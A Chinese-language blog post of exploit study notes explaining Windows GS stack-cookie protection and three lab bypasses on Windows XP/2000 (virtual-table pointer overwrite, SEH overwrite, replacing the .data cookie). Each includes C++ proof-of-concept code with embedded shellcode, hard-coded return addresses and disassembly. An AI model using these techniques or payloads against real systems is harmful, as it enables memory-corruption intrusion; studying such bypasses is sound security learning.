---
title: 漏洞学习笔记-012-GS安全编译
description: GS安全编译的原理和突破
slug: exploit-012
date: 2020-11-11 16:45:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

本文来源：[Moeomu的博客](/p/exploit-012/)

## GS安全编译的保护原理

### 简介

- 在Vistual Studio 2003(VS 7.0)后，默认启用了这个编译选项
- 位置：`Project -> project Properties -> Configuration Properties -> C/C++ -> Code Generaion -> Buffer Security Check`
- GS在所有函数调用发生时，向栈帧内压入了一个额外的随机DWORD，这个随机数被称为`canary`，这个随机数就是`Security Cookie`
- `Security Cookie`位于EBP之前，系统还将在`.data`的内存区域内存放了一个`Security Cookie`的副本
- 栈中发生溢出时，`Security Cookie`将首先被淹没，之后才是EBP和返回地址
- 在函数返回之前，系统将执行一个额外的安全验证操作，称为`Security Check`
- 在安全检查中，系统将比较栈帧中原先存放的`Security Cookie`的值和`.data`副本中的值，若两者不吻合说明`Security Cookie`已被破坏，栈中发生了溢出
- 检测到栈中发生溢出时，系统将进入异常处理流程，函数不会正常返回，ret指令也不会执行
- 额外的操作和数据的代价是系统性能的下降，所以以下情况不会应用GS：
  - 函数不包含缓冲区
  - 函数被定义为具有变量参数列表
  - 函数使用无保护的关键字标记
  - 函数在第一个语句中包含内嵌汇编代码
  - 缓冲区不是8字节类型而且不大于4字节
- 由于这些例外，依旧出现了问题，搜易VS2005 SP1中引入了新的安全标识：`#pragma strict_gs_check`，它可以堆任意函数添加安全Cookie保证安全
- 变量重排：
  - 根据局部变量的类型堆变量在栈帧中的位置进行调整，将字符串移动到栈帧的高地址防止字符串溢出时破坏其它的局部变量
  - 还将指针参数和字符串参数赋值到内存的低地址

### `Security Cookie`的细节

- 以`.data`节的第一个双字作为Cookie的种子，或称为原始Cookie(所有的函数的Cooike都用这个DWORD生成)
- 每次运行时Cookie种子都不同
- 栈帧初始化以后系统用ESP异或种子，作为当前函数的Cookie以此作为不同函数之间的区别增加Cookie随机性
- 函数返回前用ESP还原(异或)出Cookie的种子

### `Security Cookie`的问题

- 基于改写函数指针的攻击很难防御
- 针对异常处理机制的攻击，GS很难防御
- GS是对栈帧的保护，很难防御堆溢出攻击

## 利用未被保护的内存突破GS

> 测试环境：
>
> - Visual Studio 2008 Professional
> - Windows XP SP3

### 测试代码

```CPP
#include <string.h>
#include <tchar.h>

int vulfuction(char* str)
{
    char arry[4];
    strcpy(arry, str);
    return 1;
}

int _tmain(int argc, _TCHAR* argv[])
{
    char* str = "yeah, the function is without GS";
    vulfuction(str);
    return 0;
}
```

> 按理来说，valfunction不包含4字节以上的缓冲区，所以此函数的栈空间应该是不受保护的，但是实际测试的时候却是有保护的，此问题待解决

## 利用虚函数突破GS

> 只有函数在返回时才会检查栈，所以可以在函数返回前劫持流程

### 代码

```cpp
#include"string.h"

class GSVirtual {
public:
	void gsv(char * src)
	{
		char buf[200];
		strcpy(buf, src);
		vir();
	}

	virtual void vir(){}
};

int main()
{
	GSVirtual test;

	test.gsv(
		"\x72\x7A\x81\x7C" //address of "pop pop ret" 
		"\x1A\x20\x90\x90\x90\x90\x90\x90\xFC\x68\x6A\x0A\x38\x1E\x68\x63"
    	"\x89\xD1\x4F\x68\x32\x74\x91\x0C\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7"
		"\x04\x2B\xE3\x66\xBB\x33\x32\x53\x68\x75\x73\x65\x72\x54\x33\xD2"
		"\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C\x8B\x09\x8B\x69\x08\xAD"
		"\x3D\x6A\x0A\x38\x1E\x75\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C"
		"\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34"
		"\xBB\x03\xF5\x99\x0F\xBE\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0"
		"\x46\xEB\xF1\x3B\x54\x24\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B"
		"\x3C\x7B\x8B\x59\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D"
		"\x6A\x0A\x38\x1E\x75\xA9\x33\xDB\x53\x68\x6B\x61\x6F\x6F\x68\x4D"
		"\x69\x73\x61\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x90\x90\x90\x90\x90\x90\x90\x90" 
		);

	return 0;
}
```

### 说明

- 注意：测试环境为`Windows XP SP3`，编译版本为`Release`版本，编译器为`Visual Studio 2008`，编译选项为`禁用编译优化/0d`
- shellcode的前四个字节是以下汇编代码的地址，如果系统不是`Windows XP SP3`就需要修改

```x86asm
pop edi
pop esi
retn
```

- 覆写C++的虚表指针，使其指向跳板，如果需要平衡堆栈则寻找系统动态链接库中的一段指令作为跳板跳入shellcode
- 返回地址是垃圾指令则令其尽量不影响shellcode的执行，此处`0x817C`则是`cmp`指令，则此段汇编指令尽量让其不发生数据访问异常
- 此段shellcode将会弹窗

## 利用SEH突破GS

> GS并没有保护SEH，所以可以覆写SEH来实现劫持

### 代码

```cpp
#include<stdafx.h>
#include<string.h>

char shellcode[] =
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"......"
"\x90\x90\x90\x90"
"\xA0\xFE\x12\x00"//address of shellcode;

void test(char * input)
{
  char buf[200];
  strcpy(buf,input);
  strcat(buf,input);
}

void main()
{
  test(shellcode);
}
```

### 说明

> 在函数test中存在栈溢出漏洞，变量input在strcpy后将会被覆盖，而strcat将会取得一个非法地址，函数啊将会转入SEH处理流程，我们可以在`security_cookie`检查之前劫持系统流程

- 注意：测试环境为`Windows 2000 SP4`，编译版本为`Release`版本，编译器为`Visual Studio 2005`，编译选项为`禁用编译优化/0d`
- 使用`Windows 2000`的原因是为了防止`SafeSEH`的影响
- 待完成：Page:277

## 正面硬刚GS(替换.data中的原Cookie)

### 代码

```cpp
#include<string.h>
#include<stdlib.h>

char Shellcode[] =
"\x90\x90\x90\x90"//new value of cookie in .data 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xF4\x6F\x82\x90" // result of \x90\x90\x90\x90 xor EBP 
"\x90\x90\x90\x90" // Nop Code
"\x94\xFE\x12\x00" // address of Shellcode 
;

void test(char * s, int i, char * src)
{
	char dest[200];

	if(i < 0x9995)
	{
		char* buf = s + i;
		*buf = *src;
		*(buf + 1) = *(src + 1);
		*(buf + 2) = *(src + 2);
		*(buf + 3) = *(src + 3);
		strcpy(dest, src);
	}
}

void main()
{
	char* str = (char *)malloc(0x10000);
	test(str, 0xFFFF2FB8, Shellcode);
}
```

### 说明

- 注意：测试环境为`Windows XP SP3`，编译版本为`Release`版本，编译器为`Visual Studio 2008`，编译选项为`禁用编译优化/0d`
- 当i为负数时，有可能指向`.data`节
- test函数存在典型的栈溢出漏洞
- 目的：在栈溢出改掉security_cookie(ebp-0x4)的同时，将.data的前四个字节(原始cookie)也改为我们固定的值


### 细节

> 函数开始时计算security_cookie

```x86asm
00401009  |.  A1 00304000   mov eax,dword ptr ds:[__security_cookiedt>  ; 从0x403000(.data)节前四个字节取得原cookie
0040100E  |.  33C5          xor eax,ebp                                 ; 用此值和eax异或运算
00401010  |.  8945 FC       mov [local.1],eax                           ; 将此值放在ebp-0x4的地方
```

> 函数将要返回时验证security_cookie

```x86asm
...
004010CA  |> \8B4D FC       mov ecx,[local.1]                           ; 将ebp-0x4的值取出放在ecx中
004010CD  |.  33CD          xor ecx,ebp                                 ; 将ebp和ecx异或运算
004010CF  |.  E8 3D000000   call TestCons.__security_check_cookieionF>  ; 调用__security_check函数验证cookie
...

TestCons.__security_check:
00401111 > $  3B0D 00304000 cmp ecx,dword ptr ds:[__security_cookiedt>  ; 将ecx和0x403000(.data)的前四个字节比较
00401117   .  75 02         jnz short TestCons.0040111B                 ; 如果不相同则跳转到异常处理流程
00401119   .  f3:c3         rep retn                                    ; 返回
0040111B   >  E9 AC020000   jmp TestCons.__report_gsfailureokienFilte>  ; 异常处理流程函数
...
```
